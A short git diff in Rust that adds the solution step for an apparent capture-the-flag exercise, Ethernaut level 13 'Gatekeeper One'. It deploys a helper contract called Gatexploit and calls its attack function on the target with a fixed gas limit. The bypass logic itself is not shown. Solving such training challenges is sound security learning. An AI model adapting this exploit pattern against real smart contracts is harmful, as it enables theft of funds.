@@ -1,3 +1,4 @@
+use crate::abi::gatexploit::Gatexploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl13_gatekeeper_one::*;
 
@@ -26,6 +27,11 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let gatexploit =
+            Gatexploit::deploy(offender.to_owned(), ())?.send().await?;
+
+        gatexploit.attack(target.address).gas(1_000_000).send().await?.await?;
+
         Ok(())
     }
 }
